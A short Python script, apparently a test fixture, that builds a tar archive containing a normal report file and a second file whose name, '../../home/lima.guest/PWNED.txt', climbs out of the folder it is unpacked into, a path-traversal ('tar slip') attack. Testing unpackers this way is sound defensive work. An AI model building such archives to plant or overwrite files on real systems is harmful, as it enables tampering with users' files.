# Build workspace/evil.tar: one honest file and one whose name climbs
# out of whatever folder it is unpacked into.
import io, tarfile

def add(t, name, text):
    data = text.encode()
    info = tarfile.TarInfo(name)
    info.size = len(data)
    t.addfile(info, io.BytesIO(data))

with tarfile.open("workspace/evil.tar", "w", format=tarfile.USTAR_FORMAT) as t:
    add(t, "report.txt", "Q3 report\n")
    add(t, "../../home/lima.guest/PWNED.txt", "planted by the archive\n")
